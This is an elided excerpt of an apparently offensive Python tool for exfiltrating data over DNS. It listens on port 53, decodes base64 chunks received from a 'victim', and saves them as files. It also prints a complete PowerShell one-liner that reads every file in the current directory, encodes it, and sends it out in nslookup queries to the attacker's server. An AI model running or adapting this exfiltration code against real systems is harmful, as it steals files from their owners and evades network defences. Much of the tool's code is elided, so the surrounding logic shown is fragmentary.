...
def save_to_file(r_data, z, v):
    ...
    for key, value in r_data.items():
        ...
        for block in value:
            # fix data (remove hyphens at end, replace * with + because of
            # dig!)
...
# print flatdata
        ...
        try:
            ...
            print(
                "%s[Error]%s Opening file '%s' to save data." %
                (c["r"], c["e"], fname))
            exit(1)
        try:
            if v:
                print(
                    "%s[Info]%s base64 decoding data (%s)." %
                    (c["y"], c["e"], key))
        ...
        if (z):
            ...
            print(
                "%s[Info]%s Saving recieved bytes to './%s'" %
                (c["y"], c["e"], fname))
            f.write(flatdata)
            f.close()
        else:
            print(
                "%s[Info]%s Saving bytes to './%s'" %
                (c["y"], c["e"], fname))
            f.write(flatdata)
            f.close()
...
def p_cmds(s, b, ip, z):
    ...
    if (z):
        ...
        print(
            """\t%s\x23%s $d="%s"; $s=%s; $b=%s; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }""" %
            (c["r"],
             c["e"],
                ip,
                s,
...
if __name__ == '__main__':
    ...
    if re.match(regx_ip, ip) is None:
        usage(
            "%s[Error]%s First argument must be listen address." %
            (c["r"], c["e"]))
        exit(1)
    ...
    try:
        ...
        print(
            "%s[Error]%s Cannot bind to address %s:53" %
            (c["r"], c["e"], ip))
        exit(1)
    ...
    try:
        ...
        while 1:
            ...
            # slightly longer to send as this main loop recieves the data from
            # victim.
            ...
            print("%s[>]%s len: '%d bytes'\t- %s" %
                  (c["y"], c["e"], len(p.data_text), fname))
            if v:
                print(
                    '%s[>>]%s %s -> %s:53' %
                    (c["b"], c["e"], p.data_text, ip))
